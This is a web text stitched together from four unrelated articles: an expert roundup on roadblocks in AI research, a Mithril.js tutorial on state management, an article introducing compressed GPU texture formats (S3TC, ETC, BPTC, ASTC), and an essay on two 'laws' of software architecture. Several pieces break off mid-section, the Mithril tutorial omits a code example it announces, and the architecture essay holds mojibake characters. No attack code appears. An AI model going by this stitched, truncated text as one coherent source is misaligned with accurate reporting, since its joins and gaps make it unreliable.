<p>Having asked our experts what their personal 'must-read' paper choice would be, we also wanted to find out their opinion on the current state of AI, with specific emphasis on the biggest roadblocks or barriers seen in the AI space, both now and in the future. </p><p>Didn't manage to catch our last experts blogs? You can see our experts must-read paper suggestions <a href="https://blog.re-work.co/ai-papers-suggested-by-experts/">part 1</a> and <a href="https://blog.re-work.co/must-read-ai-papers-suggested-by-experts-part-2/">part 2</a>. The below touches on the concerns around deepfakes, limited compute, model size and more. </p><h2 id="jane-wang-senior-research-scientist-deepmind"><strong><a href="https://www.linkedin.com/in/jane-wang-63167017/">Jane Wang</a>, Senior Research Scientist, DeepMind</strong></h2><p>I get worried that the societal implications and ethical consequences of the newest AI technologies are not being thought out as well as they should be. There's kind of this culture with researchers in the field right now of "let's just see what's possible," in spite of the possible negative ramifications. Some particularly worrying examples include facial recognition for surveillance, and generating increasingly realistic deepfakes. </p><p>There is recognition that this is an important issue, and some steps are being taken in that direction. For instance NeurIPS this year for the first time asked all submissions to come with a "broader impacts" section to comment on the wider societal implications of the work, and groups such as Partnership on AI have been formed specifically to tackle the problem of how to implement ethical and safe AI. But unfortunately I don't think that these kinds of perspectives are all that prevalent in the wider research community.</p><hr><h2 id="alexia-jolicoeur-martineau-phd-researcher-mila"><strong><a href="https://www.linkedin.com/in/alexiajm/">Alexia Jolicoeur-Martineau</a>, PhD Researcher, MILA</strong></h2><p>The biggest roadblock to generative modelling is 1) computing power, 2) the lack of long-term coherence, and 3) the lack of ability to understand what it doesn't know. Let's take a model that generates text and interacts with humans, such as GPT-2; it can say things that make sense and even answer hard questions correctly. However, if you ask nonsensical questions, it will try to give an answer rather than say "what you are asking doesn't make sense" or "I don't know". Furthermore, if you make it generate a large amount of text, there will be no long term coherence, it will go from one thing to another. If we wanted to make models that generate tv shows or movies, we would need a model that is coherent over time, which we don't have right now. Current AIs are really powerful, but still lack a true understanding of things. A lot more computing power will be needed if we ever want to generate high-resolution videos.</p><hr><h2 id="jekaterina-novikova-director-of-machine-learning-winterlight-labs"><strong><a href="https://www.linkedin.com/in/jnovikova/">Jekaterina Novikova</a>, Director of Machine Learning, WinterLight Labs</strong></h2><p>It is close to impossible to name one biggest roadblock in general AI. The term "artificial intelligence" does not have a concrete accepted definition. We can't agree on the definition of human intelligence, let alone the artificial one, and it's difficult to say what is blocking us from achieving something we can't even name. However, if we speak about narrow AI (AI which is able to handle just one particular task) then it is an umbrella of many different subtopics, such as Machine Learning, Robotics, Natural Language Processing etc. Each of those subtopics has their own specific roadblocks and challenges that should be overcome in order to make progress in AI research. In addition, when it comes to productionalization and real-life application of AI, non-research-specific roadblocks come into play that are related to AI implementation, adoption and scaling.<br></p><p>My current research is focused on Machine Learning in Healthcare, and here I see some common challenges researchers are constantly dealing with. I've recently gave a talk on real-life challenges in detecting cognitive diseases from human speech using ML (<a href="https://www.slideshare.net/JekaterinaNovikova1/solving-reallife-challenges-in-detecting-cognitive-diseases-from-speech-using-ml">link to the slides</a>), where I mentioned several roadblocks, such as for example:</p><ul><li>Lack of relevant and appropriate data that is unbiased and does not compromise user privacy.</li><li>Limitations of English-only models. Most current developments in NLP are made in English and are not necessarily generalizable to non-English languages.</li><li>In the <a href="https://www.slideshare.net/JekaterinaNovikova1/solving-reallife-challenges-in-detecting-cognitive-diseases-from-speech-using-ml">slides</a>, I discuss more of the challenges and also present the research we are currently doing to overcome each of them.</li></ul><hr><h2 id="andriy-burkov-director-of-data-science-gartner"><strong><a href="https://www.linkedin.com/in/andriyburkov/">Andriy Burkov</a>, Director of Data Science, Gartner</strong></h2><p>If we talk about the narrow AI, the one we currently use in business, the biggest roadblock is the size of the models that provide the state of the art performance. The biggest Transformer ever trained, GPT-3, contains 175 billion parameters and costs millions of dollars to train. Only a handful of companies in the world can afford training such models and using them in production. If, in turn, the term AI is used in a more general sense, like artificial general intelligence (AGI), then the roadblock (and it's a huge one) is that we don't know exactly what science we need to develop to reach that level of machine intelligence. This is almost certainly not deep neural networks, as they are starting to reach their limits.</p><hr><h2 id="tamanna-haque-senior-data-scientist-at-jaguar-land-rover"><strong><a href="https://www.linkedin.com/in/tamannah1/">Tamanna Haque</a>, Senior Data Scientist at Jaguar Land Rover</strong></h2><p>Amongst stakeholders, business alignment on AI strategy relies on; a shared vision of effectively using data science to add business value, a mutual agenda on short and long-term business objectives and priorities, and clarity on which departments own or provide resource on different aspects of projects.</p><p>A lack of alignment creates challenges for data scientists who are tasked with opportunity scanning and delivering growth, cost-savings and value through analytics, with pressures heightened in the wake of negative economic impacts (the reality today). Between idea generation and delivery, data scientists aim to influence stakeholders to action and champion findings, but misalignment on AI strategy might effect apathy and put data scientists on the back foot to begin with.</p><p>Data scientists can build relationships with wider or cross-functional stakeholders to increase the likelihood of traction whilst increasing their knowledge of different business areas. They can also expand their network externally. A wide and diverse network keeps technical and commercial knowledge fresh whilst improving influence and communication skills- a practice which uses the help and expertise of others to enrich and get projects over the line.</p><hr><h2 id="oana-frunza-vice-president-nlp-and-ml-researcher-at-morgan-stanley"><strong><a href="https://www.linkedin.com/in/phd-oana-m-frunza-6bb3875/">Oana Frunza</a>, Vice President, NLP and ML Researcher at Morgan Stanley</strong></h2><p>Not necessarily a roadblock, but a direction we need to follow more is bridging the gap with other disciplines, especially the humanities. It is time to put <em>philosophy back in doctor of philosophy</em>. While we are good at building amazing technology, we need to start bringing in more knowledge from the world outside our disciplines to increase adoption and build trust. We will continue to advance and push forward the field, but we have to make sure that it is fit for the world around us and that the world around us is ready to adopt the solutions we build.</p><p>AI is a “gift of fire” – we must continue focusing on it enhancing our capabilities without getting burnt by the fire.</p><hr><h2 id="eric-charton-senior-director-ai-science-national-bank-of-canada"><strong><a href="https://www.linkedin.com/in/ericcharton/">Eric Charton</a>, Senior Director, AI Science, National Bank of Canada</strong></h2><p>Massive usage of (costly) computation power for minor improvement of performances is the elephant in the room. It is also difficult to have a clear view of the limitations of Deep Learning in various application context like unbalanced data (used in credit scoring), language models (dialog systems, question answering systems, text classification). What we see in mainstream publications is difficult to reproduce. We just begin to see some scientific communications with rigorous analysis of the pro and the cons of DL techniques.</p><hr><h2 id="jack-brzezinski-chief-ai-scientist-ai-systems-and-strategy-lab"><a href="https://www.linkedin.com/in/jack-brzezinski-a36245/">Jack Brzezinski</a>, Chief AI Scientist, AI Systems and Strategy Lab</h2><p>Since the inception of Artificial Intelligence there were periods of enthusiasm followed by "AI winters." Once you attempt to solve hard problems, unexpected roadblocks will appear. In a few cases, those problems were attacked head-on. Douglas Lenat's approach to building the CYC system (<a href="https://www.cyc.com/" rel="noopener">https://www.cyc.com</a>) is an example of such a frontal attack on the common sense reasoning problem, one of the hard ones in AI. In other cases, further research was necessary to move the needle in the right direction. Today, it is difficult to predict the single biggest issue that will be a roadblock. Elon Musk suggested that the interface between computers and the human brain needs a lot of improving. </p><p>His solution is to invent a more direct connection. Tom Mitchell from Carnegie Mellon suggests that machine learning algorithms should be in a state of continuous learning as opposed to a limited training phase carefully defined by the number of epochs. Perhaps, the biggest obstacle exists outside the high-tech field. Over the past decade, an enormous amount of investment was redirected from R&amp;D and used for stock buybacks and other financial operations. The legal environment often dictates the most optimal course of action for big corporations. It might take a new AI maverick similar to SpaceX in the aerospace area, to shift the focus from financial markets into research and development. Perhaps, another space race between superpowers will spark innovation. Artificial Intelligence, nuclear fusion, solid-state batteries, quantum computing, pharmaceutical research are only a few examples of many areas that are facing roadblocks.</p><hr><h2 id="abhishek-gupta-founder-montreal-ai-ethics-institute"><strong><a href="https://www.linkedin.com/in/abhishekguptamcgill/">Abhishek Gupta</a>, Founder, Montreal AI Ethics Institute</strong></h2><p>While there is emerging consensus on some of the fundamental principles as they relate to the ethics of AI, what is still starkly missing are operational guidelines for people to actually put these principles into practice. We need to have more discussions on moving from theory to practice and that requires people who have cross-domain expertise who are able to straddle both the fields of ethics and the technical domain of AI. Such individuals, especially the ones who are able to seamlessly integrate the findings from the fields will be essential in removing this roadblock.</p><hr><h2 id="jeff-clune-research-team-leader-openai"><a href="https://www.linkedin.com/in/jeff-clune-56403a26/">Jeff Clune</a>, Research Team Leader, OpenAI</h2><p>I had the pleasure of speaking with Jeff back in January.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p><a href="https://mithril.js.org/">Mithril.js</a> is a lightweight JavaScript framework that has become a staple in my development stack after I discovered it two years ago. At the time, I was looking for a simpler, zero-dependency alternative to <a href="https://reactjs.org/">React.js</a> that could help me learn modern JavaScript UI development without needing to simultaneously learn and understand various build tools and framework plugins.</p>
<p>I've since learned React and have come to appreciate it for its influence on modern web development. However, I find that Mithril, a framework that sits at half the size of React whilst containing more features, has remained my go-to.</p>
<p>When it comes to state management, Mithril is as unopinionated as they come. You can use Redux, Mobx, Cerebral, some implementation of the SAM pattern, or best of all -- just a plain ol' JavaScript object! Mithril comes with an auto-redraw system. The virtual DOM created by Mithril will diff against and synchronize the DOM whenever changes are made to your data layer. Most commonly, the redraws are triggered after a DOM event.</p>
<p>What this means in practice is that you are free to structure your data however you'd like, and Mithril takes care of the rest. Below is an example of a simple Counter application written with Mithril:</p>
<pre><code><span>let</span> count <span>=</span> <span>0</span><span>;</span><p><span>const</span> Counter <span>=</span> <span>{</span><br>  <span>view</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span><br>    <span>m</span><span>(</span><span>'div'</span><span>,</span><br>      <span>m</span><span>(</span><span>'h1'</span><span>,</span> <span>'Counter'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'p'</span><span>,</span> count<span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> <span>onclick</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> count <span>+=</span> <span>1</span> <span>}</span><span>,</span> <span>'+'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> <span>onclick</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> count <span>-=</span> <span>1</span> <span>}</span><span>,</span> <span>'-'</span><span>)</span><br>    <span>)</span><br><span>}</span><span>;</span></p><p>m<span>.</span><span>mount</span><span>(</span>document<span>.</span>body<span>,</span> Counter<span>)</span><span>;</span></p></code></pre>
<p><a href="https://flems.io/#0=N4IgZglgNgpgziAXAbVAOwIYFsZJAOgAsAXLKEAGhAGMB7NYmBvEAXwvW10QICsEqdBk2J5YxAAR0ArgwkBeCQAYA3AB00GoXEkBBAA76FE4BokSAbhBgB3RBIAUASgUA+M+YlYHAcgAmEBY+FB6eXr6EAIzBEj4AwrSyjABOPk4haGHm3j76MTIM6aGeOQBG0sTE9DHAEvTUUBDUANb2zm5SiXIA1IqREuyx3WkZWeE+5ZXVFCZ1aA1NrY4u8q6dSRIAtH0DMz6bacVOGqzqmmhY+FhdxA5+tNTSOAz4pbR+AJ4zBvpOKpQgOAwWDUYgQegIHiRABMiGhAA5NkpEEo2BwQJgcHh8NQ4AIaPRGMweGwALpURpoZqQ1AYrh4LAQYiEZLQAHSZLkHgkYj6OCIAD0Atk+maAHMcbQsALGczWVAAALQ-BKfAAZhlTJZ0CuEDQ+H4AOIH303EB1FZ+lErFJrCAA">Live Example</a></p>
<p>Our state is just a single primitive variable! For small applications, simple widgets or one-off UI components, the above solution is largely sufficient. What's important about implementing your state management solution is to understand that there is no silver bullet. You will be able to predict your needs more accurately as you work across multiple projects and grow organically. <a href="https://redux.js.org/">Redux</a> is a brilliant solution for modern UI state management, but the 9/10 times I have attempted to use it out of a desire to do things "the right way", it was absolute overkill. I advise reading <a href="https://medium.com/@dan_abramov/you-might-not-need-redux-be46360cf367">this blog post</a> by Dan Abramov, the creator of Redux.</p>
<p>While the above solution is simple and likely sufficient for small use-cases, it introduces one problem - we are modifying the state directly from within the view. It won't take long before this approach proves unwieldy, and you're scanning your templates trying to find where you wrote the logic that is altering your state in (potentially) unpredictable ways.</p>
<p>We can introduce indirection and a more versatile state container using plain JavaScript objects. Our <code>Counter</code> component becomes more terse, yet more expressive:</p>
<pre><code><span>const</span> state <span>=</span> <span>{</span> count<span>:</span> <span>0</span> <span>}</span><span>;</span><p><span>const</span> actions <span>=</span> <span>{</span><br>  <span>increment</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>+=</span> <span>1</span><span>,</span><br>  <span>decrement</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>-=</span> <span>1</span><br><span>}</span><span>;</span></p><p><span>const</span> Counter <span>=</span> <span>{</span><br>  <span>view</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span><br>    <span>m</span><span>(</span><span>'div'</span><span>,</span><br>      <span>m</span><span>(</span><span>'h1'</span><span>,</span> <span>'Counter'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'p'</span><span>,</span> state<span>.</span>count<span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>increment <span>}</span><span>,</span> <span>'+'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>decrement <span>}</span><span>,</span> <span>'-'</span><span>)</span><br>    <span>)</span><br><span>}</span><span>;</span></p><p>m<span>.</span><span>mount</span><span>(</span>document<span>.</span>body<span>,</span> Counter<span>)</span><span>;</span></p></code></pre>
<p><a href="https://flems.io/#0=N4IgZglgNgpgziAXAbVAOwIYFsZJAOgAsAXLKEAGhAGMB7NYmBvEAXwvW10QICsEqdBk2J4hcYgAIJGRpIC8k4JLoBXBokkAGSawDcAHTRHxUjNWIR6cBUqOTJENNQBOMHBskAKAJQKAfNLEsjD4agySANSKAIwU9pIAJjCu7iKavgFBIWG06lIAtLFG+kYm1lIAwnnCLrbACQBuEDAA7hl+8v4JDlheAOSJEI398WgOE5J9-YQxo5L91fkwLv0+Y5O9AwAO8zKMufnrPRPTAEaqxMT088r01FAQ1ADWmuaW1vhOqR5S7AuRNYbTbnS7XNC3ST3R4vN4WKxoOD4ZI-ES6CgLAprE4+EqGYxoLD4LA1YheRK0aiqX74M60RIATwxS1qPj0lBAcBgsHh1jwWkQWgKMQA7IgAMwAJjYHBAmBweDCcAENHojGYPDYAF0qI80M8EChOAqeFgIMRCC5oBzVC5yDwSMRtnBEAB6V3qbbPADmuSwrrNFqtUAAApL8Fp8OKA+bLdBiU58PwOcQGdtuJzXBBtqJWFrWEA">Live Example</a></p>
<p>As your application grows in size, it might be preferable that your state and actions are easily testable and replicable from the beginning. Further, instead of relying on lexical scoping for your actions to have access to your state, we can use a combination of dependency injection and closures so that an instance of your actions will always directly reference a specific state object. We can easily achieve this with factory functions that provide your initial state and actions that directly reference a single state object.</p>
<pre><code><span>const</span> <span>State</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>(</span><span>{</span> count<span>:</span> <span>0</span> <span>}</span><span>)</span><span>;</span><p><span>const</span> <span>Actions</span> <span>=</span> <span>state</span> <span>=&gt;</span> <span>(</span><span>{</span><br>  <span>increment</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>+=</span> <span>1</span><span>,</span><br>  <span>decrement</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>-=</span> <span>1</span><br><span>}</span><span>)</span><span>;</span></p></code></pre>
<p>From there, it is dead simple to reproduce your state and actions objects respectively:</p>
<pre><code><span>const</span> state   <span>=</span> <span>State</span><span>(</span><span>)</span><span>;</span><br><span>const</span> actions <span>=</span> <span>Actions</span><span>(</span>state<span>)</span><span>;</span></code></pre>
<p>Passing these to a Mithril component is trivial using the <code>attrs</code> property (near-equivalent to <code>props</code> in React) and object destructuring. Notice that our Counter component remains virtually unchanged:</p>

<p>(P.S. Credit goes to <a href="https://github.com/porsager">porsager</a> who shared this brilliant solution in the Mithril.js Gitter). <strong>This is my preferred approach to state management in Mithril.</strong> Passing your state and actions to child components would work as you'd expect. Simply pass your state and actions objects further down as <code>attrs</code>, or more wisely, be selective of what you choose to expose to child components.</p>
<p>Optional: you could also take an approach where your application is composed of solely stateless components. That is, every component is a pure, deterministic function. <a href="https://github.com/JorgeBucaran/hyperapp">Hyperapp</a> is a JavaScript framework that does not allow for local state in components. Instead, every component returns a portion of your UI that reflects the global state. While I highly recommend checking out Hyperapp (it's only 1kb gzipped!), this post is about Mithril, and you can use a similar approach with Mithril.</p>

		<p>Compressed texture formats is one of the esoteric aspects of graphics programming almost no one cares all that much about. Neither did I, however, I’ve recently taken an academic interest in the zoo of compressed texture formats.</p>
<p>During development in Granite, I occasionally find it useful to test scenes which target mobile on desktop and vice versa, and in Vulkan, where there are no fallback paths for unsupported compression formats, we gotta roll our own decompression.</p>
<p>While it really isn’t all that useful to write a decoder for these formats, my goal is to create a suite of reasonably understandable compute shader kernels which can decode all of the standard formats I care about. Of course, I could just use a Frankenstein decoder which merges together a lot of C reference decoders and call it a day, but that’s not aesthetically pleasing or interesting to me. By implementing these formats straight from the <a href="https://www.khronos.org/registry/DataFormat/">Khronos Data Format</a> specification, I learned a lot of things I would not otherwise know about these formats.</p>
<p>There are several major families of formats we can consider multi-vendor and standardized. Each of them fill their own niche. Unfortunately, desktop and mobile each have their own timelines with different texture compression standards, which is not fully resolved to this day in GPU hardware. (Basis Universal is something I will need to study eventually as well as it aims to solve this problem in software.)</p>
<p>By implementing all these formats, I got to see the evolution of block compression formats, see the major differences and design decisions that went into each format.</p>
<h3>The major format families</h3>
<p>First, it is useful to summarize all the families of texture compression I’ve looked at.</p>
<h4>S3TC / DXT</h4>
<p>The simplest family of formats. These formats are also known as the “BC” formats in Vulkan, or rather, BC 1, 2 and 3. This is the granddad of texture compression, similar to how I view MPEG1 in the video compression world.</p>
<p>These formats are firmly rooted in desktop GPUs. They are basically non-existent on mobile GPUs, probably for historical patent reasons.</p>
<h4>RGTC</h4>
<p>A very close relative of S3TC. These formats are very simple formats which specialize in encoding 1 and 2 uncorrelated channels, perfect for normal maps, metallic-roughness maps, etc. It is somewhat questionable to call these a separate family of formats (the Data Format specification separates them), since the basic format is basically exactly equal to the alpha format of S3TC, except that it extends the format to also support SNORM (-1, 1 range) alongside UNORM. These formats represent BC4 and BC5 in Vulkan.</p>
<p>These formats are firmly rooted in desktop GPUs. They are basically non-existent on mobile GPUs.</p>
<h4>ETC</h4>
<p>The ETC family of formats is very similarly laid out to S3TC in how different texture types are supported, but the implementation detail is quite different (and ETC2 is quite the interesting format). To support encoding full depth alpha and 1/2-component textures, there is the EAC format, which mirrors the RGTC formats.</p>
<p>These formats are firmly rooted in mobile GPUs. ETC1 was originally the only mandated format for OpenGLES 2.0 implementations, and ETC2 was mandated for OpenGLES 3.0 GPUs. It has almost no support on desktop GPUs. Intel iGPU is an exception here.</p>
<h4>BPTC</h4>
<p>This is where complexity starts to explode and where things get interesting. BC6 and BC7 are designed to compress high quality color images at 8bpp. BC6 adds support for HDR, which is to this day, one of only two ways to compress HDR images.</p>
<p>On desktop, BPTC is the state of the art in texture compression and was introduced around 2010.</p>
<h4>ASTC</h4>
<p>ASTC is the final boss of texture compression, and is the current state of the art in texture compression. Its complexity is staggering and aims to dominate the world with 128 bits. Mere mortals are not supposed to understand this format.</p>
<p>ASTC’s roots are on Mali GPUs, but it was always a Khronos standard, and is widely supported now on mobile Vulkan implementation (and Intel iGPU :3), at least the LDR profile. What you say, profiles in a texture compression format? Yes … yes, this is just the beginning of the madness that is ASTC.</p>
<h4>PVRTC?</h4>
<p>PVRTC is a PowerVR-exclusive format that has had some staying power due to iOS and I will likely ignore it in this series. However, it seems like a <strong>very different kind of format</strong> to all the others and studying it might be interesting. However, there is zero reason to use this format in Granite, and I don’t want to chew over too much.</p>
<h2>What is a texture compression format anyway?</h2>
<p>In a texture compression format, the specification describes a process for taking random bits given to it, and how to decode the bit-soup into texels. There are fundamental constraints in texture compression which is unique to this problem domain, and these restrictions heavily influence the design of the formats in question.</p>
<h4>Fixed block size</h4>
<p>To be able to randomly access any texel in a texture, there must be an O(1) mapping from texture coordinate to memory address. The only reasonable way to do this is to have a fixed block size. In all formats, 4×4 is the most common one. (As you can guess, ASTC can do odd-ball block sizes like 6×5).</p>
<p>Similarly, for reasons of random access, the number of bits spent per block must be constant. The typical block sizes are 64-bits and 128-bits, which is 4bpp and 8bpp respectively at 4×4 block size.</p>
<p>Image and video compression has none of these restrictions. That is a major reason why image and video compression is so much more efficient.</p>
<h4>A set of coding tools</h4>
<p>Each format has certain things it can do. The more complex the operations the format can do, the more expensive the decoding hardware becomes (and complex a software decoder becomes), so there’s always a challenge to balance complexity with quality per bit when standardizing a format. The most typical way to add coding tools is to be able to select between different modes of operation based on the content of the block, where each mode is suited to certain patterns of input. Use the right tool for the job! As we will see in this study, the number of coding tools will increase exponentially, and it starts to become impossible to make good use of all the tools given to you by the format.</p>
<p>Encoding becomes an optimization task where we aim to figure out the best coding tools to use among the ones given to us. In simpler formats, there are very few things to try, and approaching the optimal solution becomes straight forward, but as we get into the more esoteric formats, the real challenge is to prune dead ends early, since brute forcing our way through a near-infinite configuration space is not practical (but maybe it is with GPU encode? :3)</p>
<h2>Commonalities across formats</h2>
<p>Image compression and video compression uses the Discrete Cosine Transform (DCT) even to this day. This fundamental compression technique has been with us since the 80s and refuses to die. All the new compression formats just keep piling on complexity on top of more complexity, but in the center of it all, we find the DCT, or some equivalent of it.</p>
<p>Very similarly, texture compression achieves its compression through interpolation between two color values. Somehow, the formats all let us specify two <strong>endpoints</strong> which are constant over the 4×4 block and interpolation <strong>weights</strong>, which vary per pixel. Most of the innovation in the formats all comes down to how complicated and esoteric we can make the process of generating the endpoints and weights.</p>
<p>The weight values are typically expressed with very few bits of precision per texel (usually 2 or 3), and this is the main way we will keep bits spent per pixel down. This snippet is the core coding tool in all the formats I have studied:</p>
<pre>decoded_texel = mix(endpoint0, endpoint1, weight_between_0_and_1);</pre>
<h4>To correlate, or not to correlate?</h4>
<p>The endpoint model blends all components in lock-step. Typically the endpoint will be an RGB value. We call this correlated, because this interpolation will only work well if chrominance remains fairly constant with luminance being the only component which varies significantly. In uncorrelated input, say, RGB with an alpha mask, many formats let us express decorrelated inputs with two sets of weights.</p>
<pre>decoded_rgb = mix(endpoint0_rgb, endpoint1_rgb, rgb_weight);
decoded_alpha = mix(endpoint0_alpha, endpoint1_alpha, alpha_weight);</pre>
<p>This costs a lot more bits to encode since alpha_weight is very different from rgb_weight, but it should be worth it.</p>
<p>Many formats let us express if there is correlation or not. Correlation should always be exploited.</p>
<h4>Working around the horrible endpoint interpolation artifacts</h4>
<p>Almost all formats beyond the most trivial ones try really hard to come up with ways to work around the fact that endpoint interpolation leads to horrible results in all but the simplest input. The most common approach here is to split the block into partitions, where each partition has its own endpoints.</p>
<h2>S3TC – The basics</h2>
<p>A compute shader decoder:</p>
<p><a href="https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/s3tc.comp">https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/s3tc.comp</a></p>
<p><a href="https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/rgtc.h">https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/rgtc.h</a></p>
<h3>BC1 – 4×4 – 64 bits</h3>
<p>The BC1 format is extremely simple and a good starting point. 32 bits is used to encode two RGB endpoints in RGB565 format. The other 32 bits encode 16 weights, with 2 bits allocated to each texel.</p>
<p>This lets us represent interpolation weights of 0, 1/3, 2/3 and 1.</p>
<p>Since there is a symmetry in this design, i.e.:</p>
<pre>mix(a, b, l) == mix(b, a, 1.0 - l)</pre>
<p>there would be two ways to specify the same block, where we swap endpoints and invert the weights to compensate. This is an extra bit of information we can exploit. Based on the integer representation of the two endpoints, we can check if one of greater than the other, and use a different decoding mode based on that information.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
    
<p>After completing the short <a href="https://ufried.com/blog/oss_1_rise_of_oss/">“OSS” blog series</a> series and before returning to the <a href="https://ufried.com/blog/simplify_1/">“Simplify!” blog series</a> that grew quite a lot while writing, I would like to discuss a completely different topic. I call it “the two first laws of architectural work”.</p>
<p>Of course, what I will describe are not actual laws. “Findings” or “lessons” (without the educational undertone) would be more accurate.</p>
<p>And even if they were laws, I do not know if they would be the first two ones. I just called them the first two ones to emphasize their relative importance. At least I find them very relevant as I see so many places where they are – often willfully – ignored which usually leads to negative consequences.</p>
<p>So, “Two IMO relevant findings regarding architectural work” would probably be a more accurate title. But that would not sound so impressive … ;)</p>
<p>Also, it would not express how important I think the two observations are. Therefore I will stick with the “two first laws”.</p>
<h2 id="the-first-law-of-architectural-work">The first law of architectural work</h2>
<p>The first law of architectural work, as I call it, is:</p>
<blockquote>
<p><strong>Every decision has its price. No decision is for free.</strong></p>
</blockquote>
<p>The longer version is:</p>
<blockquote>
<p>No decision only has upsides. Every decision also has downsides.</p>
</blockquote>
<p>I think that it is essential to understand that there is no free lunch in architectural work. Whenever you decide for an architectural option, you will get a mix of advantages and disadvantages. While in coding you sometimes have situations where one option is <em>right</em> and the others are <em>wrong</em>, you will never have such a situation in architectural work.</p>
<p>In architectural work, there is no “right” or “wrong”. There is only “better” or “worse”. I often tend to say, while in development things like “black” or “white”, 0 or 1 exist, in architecture only many shades of gray, the numbers between 0 and 1 exist. With every architectural decision you will get something, but you will also pay a price for it.</p>
<p>I am not sure if this pattern is as old as our industry, but especially in the recent years I noticed a growing tendency only to mention the potential advantages of a solution and hide the disadvantages.</p>
<p>I’ve seen too many talks talks, articles, posts, and alike, that just praise some concept, technology or method, “Do &lt;X&gt; and everything will be fine!” being the typical message. Downsides? Trade-offs? Nil return!</p>
<p>We could ignore those types of messages if they would not lead to really bad solutions in actual projects if project teams blindly pick up those messages. Two little examples:</p>
<p><strong>Microservices</strong></p>
<p>In the recent years, most IT projects went for microservices, often based on dubious rationales. But are microservices really “right” while the vilified monoliths are “wrong”?</p>
<p>If you take a neutral stance, you see that microservices can help you, e.g., with decoupling capability teams better, to implement some type of NFRs better and to upgrade technology easier. On the other hand they multiply operations complexity by orders of magnitude. And if you do not get your functional design right, availability and response times of the resulting application will badly suffer.</p>
<p>(Deployment) monoliths on the other side are the simplest type of application structure in operations. One executable, that’s it. Either it is up or down. Easy to monitor. Well-known and proven scaling patterns (replication and load balancers) if implemented correctly. On the other hand monoliths tend to become a big ball of mud, which is hard to maintain and leads to tight team coupling. Also technology upgrades become harder with the size of the application.</p>
<p>There would be a lot of details to add, but the message already becomes clear: It is not that one is “right” and the other is “wrong” (as many people try to suggest). Both have their strengths and weaknesses. Deciding for any one of the two gives you some advantages while it also gives you some disadvantages at the same time. And hiding the disadvantages does not make them go away.</p>
<p><strong>Event-based communication</strong></p>
<p>Event-based communication is another fashionable concept of the recent years and its advocates tend to talk down request-response-based communication.</p>
<p>Again, taking a neutral stance, you see that event-based communication, e.g., helps to decouple parts better on a technical level, the reversed dependency relation (receiver knows sender) can be advantageous, event brokers can even create location transparency, timeouts can be handled differently and more.</p>
<p>On the other hand event-based communication quickly creates complex communication patterns that are hard to understand, that can easily result in deadlocks and other unexpected behaviors, that can create a tight functional coupling between the parts if not designed very carefully, creates new challenges like dealing with lost or duplicate messages.</p>
<p>Request-response-based communication on the other side is easy to grasp as it resembles the call-stack pattern of communication flow that we are used to. It is very easy to implement and the system behavior tends to be a lot more deterministic and predictable as with event-based communication. On the other hand, blocking requests and latency – or timeouts if you monitor the call durations – either lead to undesired system behavior at runtime or quite some added complexity.</p>
<p>Again, while the discussion is not complete, the same message takes shape: It is not that one is “right” and the other is “wrong”. Both have their strengths and weaknesses.</p>
<p>I could a lot more examples, but these two little examples should be sufficient to illustrate what I mean with “Every decision has its price”.</p>
<p>If you are experienced in architectural work, this “law” should be obvious for you. Yet, I see a lot of people either willingly or unconsciously ignoring it. This becomes especially dangerous if “Agile” developer teams decide to make architectural work without anyone on the team having the required education and experience. Based on my observations, these teams tend to be very vulnerable to “Do &lt;X&gt; and everything will be fine!” messages. <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>
<p>To wrap the first law up: The key to good architectural work is to find architectural decisions – or options if you prefer that term – that has more upsides than downsides.</p>
<p>This leaves the question, how to determine the up- and downsides of an option, which immediately leads to the second law.</p>
<h2 id="the-second-law-of-architectural-work">The second law of architectural work</h2>
<p>The second law of architectural work, as I call it, is:</p>
<blockquote>
<p><strong>A decision can only be evaluated with respect to its context.</strong></p>
</blockquote>
<p>The longer version is:</p>
<blockquote>
<p>Decisions are not invariably â€œgoodâ€� or â€œbadâ€�, but only with respect to a given context.</p>
</blockquote>
<p>This “law” is almost as important as the first one. I see too many decisions where advantages or disadvantages of concepts, technologies or methods are discussed without taking the actual context into account.</p>
<p>While there is nothing wrong to point out general trade-offs of an architectural option, it must be clear that they are never final but can only support the actual decision making process.</p>
<p>To illustrate that point, let us briefly revisit the microservices example from above. I sketched some advantages and disadvantages of microservices and monoliths. Which one to take (making the simplifying assumption here that those were the only options available)?</p>
<p>Well, it depends!</p>
<p>What is your context? You are a hyperscaler or live in a market where you need to move very fast with independent capability teams and we discuss customer-facing applications? Probably microservices will be the better option for you as the competitive advantages in terms of market responsiveness they give you will outweigh their disadvantages while for monoliths the opposite is true in the given context.</p>
<p>You are, e.g., an insurance company living in the highly regulated German market and we discuss an accounting solution? While microservices will give you basically no competitive advantages in such a setting, they offer grave disadvantages compared to a monolithic solution. So, very likely the monolith will be the better option.</p>
<p>You are a standard software manufacturer who sells solutions to clients who need to run the solutions (i.e., no SaaS solutions) and the operations teams of the client often do not have deep IT knowledge (a setting that you find quite often in SME-type companies). While on the development side microservices could give you a competitive advantage, your clients most likely would be hopelessly overstrained running a microservices solution.</p>
